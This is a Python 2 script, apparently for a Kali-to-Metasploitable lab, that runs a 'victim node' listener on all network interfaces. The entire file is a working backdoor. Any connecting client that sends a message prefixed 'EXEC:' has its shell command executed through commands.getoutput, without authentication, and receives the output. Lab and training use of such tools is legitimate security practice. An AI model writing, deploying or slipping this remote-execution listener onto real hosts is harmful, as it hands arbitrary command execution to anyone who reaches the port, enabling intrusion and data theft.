#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
P2P Victim Node - Legacy Python 2.7
Designed for Metasploitable targets
"""

import socket
import threading
import sys
import commands # Essential for Python 2 to capture shell output easily
import os

class P2PVictim:
    def __init__(self, port):
        self.port = int(port)
        self.running = True

    def start(self):
        """Starts the victim listener on all interfaces."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", self.port))
        s.listen(5)
        print "[*] Victim Node active on port %s" % self.port
        
        while self.running:
            conn, addr = s.accept()
            # Spawn a thread for the attacker connection
            threading.Thread(target=self.handle_messages, args=(conn, addr)).start()

    def handle_messages(self, conn, addr):
        """Processes incoming requests from the attacker node."""
        while self.running:
            try:
                data = conn.recv(8192)
                if not data: break
                
                # REMOTE EXECUTION LOGIC
                if data.startswith("EXEC:"):
                    # Command Cleanup: EXEC:all:whoami -> extracts 'whoami'
                    # Split into 3 parts: Header, Target, Command
                    parts = data.split(":", 2)
                    if len(parts) >= 3:
                        cmd = parts[2]
                        print "[!] Executing remote command: " + cmd
                        
                        # Real execution on Metasploitable (Python 2 method)
                        output = commands.getoutput(cmd)
                        
                        # Send result back to the Kali controller
                        conn.sendall("[METASPLOITABLE OUTPUT]\n" + output)
                    else:
                        conn.sendall("[ERROR] Malformed EXEC request")
                
                elif data.startswith("UPLOAD:"):
                    # Simplified placeholder for Python 2 compatibility
                    conn.sendall("[OK] File upload not fully implemented on Python 2 node, use EXEC for now.")
                
                else:
                    # Echo standard messages
                    print "[MSG from %s] %s" % (addr[0], data)
                    conn.sendall(data.upper()) # Respond with uppercase echo
            except Exception as e:
                print "[ERROR] Handler crashed: " + str(e)
                break
        conn.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage: python p2p_victim.py <port>"
        sys.exit(1)
        
    P2PVictim(sys.argv[1]).start()
